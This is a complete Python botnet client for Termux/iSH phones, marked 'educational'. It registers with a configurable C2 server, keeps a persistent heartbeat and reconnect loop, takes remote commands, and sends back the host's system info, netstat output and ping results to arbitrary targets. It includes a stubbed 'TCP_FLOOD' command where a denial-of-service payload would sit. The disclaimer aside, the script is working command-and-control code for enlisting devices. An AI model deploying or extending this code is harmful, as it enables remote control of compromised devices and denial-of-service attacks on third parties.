#!/usr/bin/env python3
# EDUCATIONAL USE ONLY - FOR TERMUX/iSH
# Requires: pip install requests

import socket
import threading
import time
import subprocess
import platform
import os
import sys

class MobileBot:
    def __init__(self, c2_host, c2_port=5555):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.running = True
        self.local_ip = self.get_local_ip()
        self.bot_id = f"{self.local_ip}:{os.getpid()}"
        
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def execute_command(self, cmd):
        """Execute command and return output"""
        try:
            if cmd == "GET_IP":
                return f"Local IP: {self.local_ip}"
            
            elif cmd == "PING_C2":
                # Ping C2 server
                result = subprocess.run(['ping', '-c', '4', self.c2_host], 
                                      capture_output=True, text=True, timeout=10)
                return result.stdout or "Ping failed"
            
            elif cmd.startswith("PING "):
                target = cmd[5:].strip()
                if target:
                    result = subprocess.run(['ping', '-c', '4', target],
                                          capture_output=True, text=True, timeout=10)
                    return result.stdout or f"Ping to {target} failed"
            
            elif cmd == "SYSTEM_INFO":
                system = platform.system()
                machine = platform.machine()
                processor = platform.processor()
                return f"OS: {system}\nArch: {machine}\nCPU: {processor}"
            
            elif cmd == "NETSTAT":
                # Show network connections
                result = subprocess.run(['netstat', '-an'],
                                      capture_output=True, text=True)
                return result.stdout[:500]  # First 500 chars
            
            elif cmd.startswith("TCP_FLOOD "):
                # SIMULATION ONLY - Educational
                parts = cmd.split(" ")
                if len(parts) >= 4:
                    target, port, duration = parts[1], parts[2], parts[3]
                    return f"[SIM] Would send packets to {target}:{port} for {duration}s"
                return "Usage: TCP_FLOOD target port duration"
            
            elif cmd == "HELP":
                return ("Available commands: GET_IP, PING [target], PING_C2, "
                       "SYSTEM_INFO, NETSTAT, TCP_FLOOD target port duration")
            
            else:
                return f"Unknown command: {cmd}"
                
        except subprocess.TimeoutExpired:
            return "Command timeout"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def connect_to_c2(self):
        """Main connection loop with reconnect logic"""
        reconnect_delay = 5
        
        while self.running:
            try:
                print(f"[*] Connecting to C2 at {self.c2_host}:{self.c2_port}")
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((self.c2_host, self.c2_port))
                
                # Receive welcome
                welcome = sock.recv(1024).decode()
                print(f"[*] Connected: {welcome}")
                
                # Register with C2
                register_msg = f"REGISTER|MOBILE_BOT:{platform.system()}:{self.local_ip}"
                sock.send(register_msg.encode())
                
                ack = sock.recv(1024).decode()
                print(f"[*] Registration: {ack}")
                
                reconnect_delay = 5  # Reset delay on success
                
                # Main communication loop
                while self.running:
                    try:
                        # Send heartbeat every 30 seconds
                        sock.send(b"HEARTBEAT")
                        response = sock.recv(1024).decode()
                        
                        if response == "PING":
                            sock.send(b"PONG")
                        
                        # Check for commands (non-blocking)
                        sock.settimeout(1)
                        try:
                            data = sock.recv(1024).decode()
                            if data:
                                if data.startswith("CMD|"):
                                    command = data[4:]
                                    print(f"[*] Received command: {command}")
                                    
                                    # Execute command
                                    result = self.execute_command(command)
                                    
                                    # Send result back
                                    sock.send(f"RESULT|{result}".encode())
                                    sock.recv(1024)  # Wait for ack
                                else:
                                    print(f"[*] Server: {data}")
                        except socket.timeout:
                            pass
                        
                        sock.settimeout(30)
                        time.sleep(30)  # Heartbeat interval
                        
                    except socket.timeout:
                        print("[!] Connection timeout, reconnecting...")
                        break
                    except Exception as e:
                        print(f"[!] Connection error: {e}")
                        break
                
                sock.close()
                
            except ConnectionRefusedError:
                print(f"[!] C2 server not responding at {self.c2_host}:{self.c2_port}")
            except Exception as e:
                print(f"[!] Connection failed: {e}")
            
            if self.running:
                print(f"[*] Reconnecting in {reconnect_delay} seconds...")
                time.sleep(reconnect_delay)
                reconnect_delay = min(reconnect_delay * 2, 60)  # Exponential backoff
    
    def start(self):
        print(f"[*] Mobile Bot Starting")
        print(f"[*] Bot ID: {self.bot_id}")
        print(f"[*] Local IP: {self.local_ip}")
        print(f"[*] C2 Server: {self.c2_host}:{self.c2_port}")
        print("[!] FOR EDUCATIONAL USE ONLY")
        print("-" * 50)
        
        # Start connection thread
        conn_thread = threading.Thread(target=self.connect_to_c2, daemon=True)
        conn_thread.start()
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Shutting down bot...")
            self.running = False
            conn_thread.join(2)

if __name__ == "__main__":
    # CONFIGURE THESE VALUES
    C2_SERVER_IP = "192.168.1.100"  # CHANGE TO YOUR C2 SERVER IP
    # C2_SERVER_IP = "10.0.2.2"      # For Android Emulator
    # C2_SERVER_IP = "localhost"     # For local testing
    
    if len(sys.argv) > 1:
        C2_SERVER_IP = sys.argv[1]
    
    bot = MobileBot(C2_SERVER_IP, 5555)
    bot.start()